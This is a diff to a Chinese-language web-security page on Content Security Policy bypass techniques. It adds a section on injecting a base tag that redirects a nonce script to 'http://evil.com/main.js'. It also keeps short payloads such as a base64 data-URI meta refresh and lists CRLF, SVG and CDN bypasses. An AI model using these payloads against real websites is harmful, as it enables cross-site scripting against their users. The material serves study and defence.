@@ -138,7 +138,6 @@ MIME Sniff
 
 举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再``<script href='http://xxx.com/xx.jpg'>``，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本
 
-
 302跳转
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 对于302跳转绕过CSP而言，实际上有以下几点限制：
@@ -150,10 +149,21 @@ iframe
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 当可以执行代码时，可以创建一个源为 ``css`` ``js`` 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 ``../../../`` ``/%2e%2e%2f`` 等可能触发服务器报错的链接也可以到达相应的目的。
 
+base-uri
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+当script-src为nonce或无限制，且base-uri无限制时，可通过 ``base`` 标签修改根URL来bypass，如下加载了http://evil.com/main.js
+
+::
+
+    <base href="http://evil.com/">
+    <script nonce="correct value" src="/main.js"></script>
 
 其他
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-- CND Bypass,如果网站信任了某个CDN, 那么可利用相应的CDN bypass
+- location 绕过
+- 可上传SVG时，通过恶意SVG绕过同源站点
+- 存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析
+- CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass
 - Angular versions <1.5.9 >=1.5.0，存在漏洞 `Git Pull Request <https://github.com/angular/angular.js/pull/15346>`_
 - jQuery sourcemap 
     ::
@@ -164,8 +174,3 @@ iframe
 - For FireFox ``<META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">``
 - ``<link rel="import" />``
 - ``<meta http-equiv="refresh" content="0; url=http://...." />``
-- 当script-src为nonce或无限制，且base-uri无限制时，可通过 ``base`` 标签修改根URL来bypass，如下加载了http://evil.com/main.js
-    ::
-
-        <base href="http://evil.com/">
-        <script nonce="correct value" src="/main.js"></script>
